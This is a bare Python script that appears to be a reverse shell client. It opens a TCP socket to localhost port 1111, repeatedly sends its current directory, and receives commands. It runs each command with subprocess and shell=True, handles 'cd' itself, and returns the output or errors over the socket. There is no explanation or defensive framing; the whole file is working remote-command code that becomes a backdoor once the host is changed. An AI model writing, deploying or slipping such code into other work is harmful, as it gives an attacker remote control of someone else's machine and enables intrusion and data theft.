import os, socket, subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 1111))

while True:
	out1 = err1 =""
	a = os.getcwd()
	a = a.encode()
	s.send(a)
	cmd = s.recv(1024)
	cmd = cmd.decode()
	if cmd.startswith("cd "):
		try:
			os.chdir(cmd.split(" ")[1])
			s.send(b"Directory changed !\n")
		except FileNotFoundError:
			s.send(b"Le chemin d'acces est introuvable :/\n")

	else:
		back = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
		out, err = back.communicate()
		if len(out) < 1 and len(err) > 1:
			for element in err:
			    element = bytes([element])
			    try:
			        err1 += element.decode('utf-8')
			    except Exception as e:
			        err1 += "?"
			s.send(err1.encode())
		elif len(err) < 1 and len(out) > 1:
			for element in out:
			    element = bytes([element])
			    try:
			        out1 += element.decode('utf-8')
			    except Exception as e:
			        out1 += "?"
			s.send(out1.encode())
		else:
			s.send(b"Done !")
		
